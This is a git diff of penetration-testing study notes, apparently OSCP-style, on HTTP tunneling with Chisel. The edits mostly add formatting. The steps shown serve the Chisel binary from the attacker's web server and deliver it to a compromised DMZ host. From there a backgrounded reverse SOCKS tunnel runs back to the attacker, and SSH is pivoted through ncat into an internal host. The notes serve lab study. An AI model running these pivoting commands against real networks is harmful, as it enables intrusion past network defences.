@@ -3706,16 +3706,16 @@ The first time plink connects to a host, it will attempt to cache the host key i
 ### <ins>HTTP Tunneling</ins>
 
 #### <ins>Chisel</ins>
-1. The machines are KALI01, DMZ01 and INTERNAL01
-   - KALI01 will listen on TCP port `1080`, a SOCKS proxy port
-2. In KALI01, copy the [Chisel](https://www.kali.org/tools/chisel/) binary to the Apache2 server folder `sudo cp $(which chisel) /var/www/html/` and start Apache2 `sudo systemctl start apache2`
-3. Deliver the Chisel executable to the DMZ
-4. On KALI01, run Chisel `chisel server --port 8080 --reverse` and run `sudo tcpdump -nvvvXi <INTERFACE> tcp port 8080`
+1. The machines are `KALI01`, `DMZ01` and `INTERNAL01`
+   - `KALI01` will listen on TCP port `1080`, a SOCKS proxy port
+2. In `KALI01`, copy the [Chisel](https://www.kali.org/tools/chisel/) binary to the Apache2 server folder `sudo cp $(which chisel) /var/www/html/` and start Apache2 `sudo systemctl start apache2`
+3. Deliver the Chisel executable to the `DMZ`
+4. On `KALI01`, run Chisel `chisel server --port 8080 --reverse` and run `sudo tcpdump -nvvvXi <INTERFACE> tcp port 8080`
    - `ip a` retrieve the list of all interfaces
-5. On DMZ01, run the Chisel client command`/tmp/chisel client <KALI01-IP>:8080 R:socks > /dev/null 2>&1 &`
+5. On `DMZ01`, run the Chisel client command`/tmp/chisel client <KALI01-IP>:8080 R:socks > /dev/null 2>&1 &`
 6. Now, you should be able to see inbound Chisel traffic and an incoming connection in the Chisel server
-7. Check if the SOCKS port has been opened by the Kali Chisel server with `ss -ntplu`
-8. Finally, pass an Ncat command to ProxyCommand to use the socks5 protocol and the proxy socket at 127.0.0.1:1080
+7. Check if the SOCKS port has been opened by the `KALI01` Chisel server with `ss -ntplu`
+8. Finally, pass an Ncat command to ProxyCommand to use the socks5 protocol and the proxy socket at `127.0.0.1:1080` to connect to `INTERNAL01`
    - `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
    - `%h` and `%p` tokens represent the SSH command host and port values
 
